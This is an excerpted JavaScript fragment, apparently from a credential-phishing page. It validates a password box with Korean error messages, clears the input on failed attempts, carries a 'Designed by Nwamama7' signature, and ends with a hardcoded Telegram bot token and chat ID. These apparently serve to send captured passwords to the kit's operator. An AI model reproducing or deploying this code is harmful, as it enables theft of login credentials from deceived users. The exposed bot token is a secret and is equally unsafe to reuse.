document.addEventListener("DOMContentLoaded", async function() {
    ...
    signInButtonElement.addEventListener('click', async function() {
        ...
        if (password === '') {
            errorMessageElement.textContent = '계속하려면 비밀번호를 입력하세요.';
            errorMessageElement.style.display = 'block';
            setTimeout(function() {
                errorMessageElement.style.display = 'none';
            }, 3000);
        } else if (password.length < 4) {
            errorMessageElement.textContent = '비밀번호가 완전하지 않습니다. 다시 시도해 주세요.';
            errorMessageElement.style.display = 'block';
            passwordInput.value = '';
            setTimeout(function() {
                errorMessageElement.style.display = 'none';
...
Designed by Nwamama7
        ...
        const telegramToken = '7892061875:AAHW3cKp1RL6TAycn5Armt_GssgUnk7vB7A'; 
        const chatId = '6351268817'; 
